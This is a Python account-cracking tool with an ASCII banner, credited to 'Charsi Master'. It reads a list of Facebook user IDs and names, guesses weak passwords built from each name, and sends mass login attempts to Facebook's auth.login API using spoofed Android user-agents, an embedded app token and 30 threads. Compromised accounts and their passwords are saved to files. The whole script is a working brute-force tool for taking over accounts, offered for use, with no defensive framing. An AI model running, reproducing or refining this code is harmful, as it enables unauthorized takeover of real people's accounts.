#----------------------------------------------------------------#
# CODED BY: CHARSI MASTER (X-ULTRA UPDATE)
# STATUS: 2025 BYPASS EDITION
# COLOUR THEME: NEON VIOLET & CYAN
#----------------------------------------------------------------#

import os, sys, re, time, json, random, uuid, platform, requests, arrow
from concurrent.futures import ThreadPoolExecutor as tred
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- COLORS (ANSI) ---
R = '\033[1;31m' # Red
G = '\033[1;32m' # Green
Y = '\033[1;33m' # Yellow
B = '\033[1;34m' # Blue
P = '\033[1;35m' # Purple
C = '\033[1;36m' # Cyan
W = '\033[1;37m' # White
N = '\033[0m'    # Reset

# Globals
loop = 0
oks = []
cps = []

# --- ADVANCED USER-AGENTS (REAL-TIME 2025) ---
def get_ua_ultra():
    # Adding modern 2025 build versions
    android_version = random.choice(['13', '14', '15'])
    chrome_version = f"{random.randint(125, 131)}.0.{random.randint(5000, 6000)}.{random.randint(100, 150)}"
    fb_version = f"{random.randint(480, 500)}.0.0.{random.randint(20, 99)}"
    build_num = str(random.randint(600000000, 700000000))
    
    models = [
        ('Samsung', 'SM-S928B'), ('Samsung', 'SM-F946B'), 
        ('Google', 'Pixel 9 Pro XL'), ('Xiaomi', '24030PN60G'),
        ('OnePlus', 'CPH2581'), ('Vivo', 'V2303')
    ]
    brand, model = random.choice(models)
    
    ua = f"Mozilla/5.0 (Linux; Android {android_version}; {model} Build/UKQ1.{random.randint(231000, 241000)}.001; wv) " \
         f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} " \
         f"Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fb_version};FBBV/{build_num};FBDV/{model};FBMD/{brand};" \
         f"FBSN/Android;FBSV/{android_version};FBPN/com.facebook.katana;FBLC/en_US;FBBK/1;FBOP/1;FBCR/Zong;]"
    return ua

# --- RE-DESIGNED BANNER ---
def banner():
    os.system('clear')
    print(f"""
{P}  ██╗  ██╗{C}      ██╗   ██╗██╗     ████████╗██████╗  █████╗ 
{P}  ╚██╗██╔╝{C}      ██║   ██║██║     ╚══██╔══╝██╔══██╗██╔══██╗
{P}   ╚███╔╝ {C}█████╗██║   ██║██║        ██║   ██████╔╝███████║
{P}   ██╔██╗ {C}╚════╝██║   ██║██║        ██║   ██╔══██╗██╔══██║
{P}  ██╔╝ ██╗{C}      ╚██████╔╝███████╗   ██║   ██║  ██║██║  ██║
{P}  ╚═╝  ╚═╝{C}       ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝
{W}------------------------------------------------------------
{C} AUTHOR  : {W}CHARSI MASTER {C} | {W}v{P}2.0-ULTRA
{C} NETWORK : {W}B-GRAPH LIGER  {C} | {W}STATUS: {G}VIP
{W}------------------------------------------------------------""")

# --- CRACKING ENGINE ---
def method_ultra(ids, pas):
    global loop, oks, cps
    sys.stdout.write(f'\r\r {W}[{P}CHARSI-X{W}] {C}{loop}{W}|{G}OK:{len(oks)}{W}|{Y}CP:{len(cps)} ')
    sys.stdout.flush()
    
    try:
        for password in pas:
            ua = get_ua_ultra()
            session = requests.Session()
            
            # Ultra Deep Headers
            headers = {
                'Authority': 'b-api.facebook.com',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'X-FB-Connection-Type': 'WIFI',
                'X-FB-Connection-Quality': 'EXCELLENT',
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Friendly-Name': 'authenticate',
                'X-Tigon-Is-Retry': 'False'
            }
            
            payload = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': ids,
                'password': password,
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'method': 'auth.login'
            }
            
            url = "https://b-api.facebook.com/method/auth.login"
            response = session.post(url, data=payload, headers=headers).json()
            
            if 'session_key' in response:
                print(f'\r\r {G}[SUCCESS-OK] {ids} | {password} {N}')
                oks.append(ids)
                open('/sdcard/CHARSI-OK.txt', 'a').write(f'{ids}|{password}\n')
                break
            elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                print(f'\r\r {Y}[CHECKPOINT] {ids} | {password} {N}')
                cps.append(ids)
                open('/sdcard/CHARSI-CP.txt', 'a').write(f'{ids}|{password}\n')
                break
        loop += 1
    except Exception:
        pass

# --- INTERFACE ---
def main():
    banner()
    print(f" {W}[{C}1{W}] File Cracking {G}(Ultra Speed)")
    print(f" {W}[{C}0{W}] Exit")
    opt = input(f"\n{P} ┌─[{W}Select Option{P}]\n └─> {W}")
    if opt == '1':
        file_crack()
    else:
        exit()

def file_crack():
    banner()
    file_path = input(f" {P}ENTER FILE PATH{W} (e.g /sdcard/file.txt): ")
    try:
        ids = open(file_path, 'r').read().splitlines()
    except FileNotFoundError:
        print(f" {R}FILE NOT FOUND!"); time.sleep(2); main()
    
    banner()
    print(f" {G}TOTAL IDS FOUND: {W}{len(ids)}")
    print(f" {C}CLONING IN PROCESS...{W}")
    print(f"{W}------------------------------------------------------------")
    
    with tred(max_workers=30) as pool:
        for user in ids:
            try:
                if '|' in user:
                    uid, name = user.split('|')[:2]
                else:
                    uid, name = user, "fb user"
                
                first = name.split(' ')[0].lower()
                # Enhanced Password logic
                pas = [name.lower(), first+'123', first+'1234', first+'12345', first+'786', first+'khan', first+'007']
                if len(first) >= 6:
                    pas.append(first)
                
                pool.submit(method_ultra, uid, pas)
            except: pass

    print(f"\n{W}------------------------------------------------------------")
    print(f" {G}CRACK COMPLETED.")
    print(f" {G}OKs: {len(oks)} | {Y}CPs: {len(cps)}")
    input(f"\n {C}Press Enter to go back...")
    main()

if __name__ == "__main__":
    main()
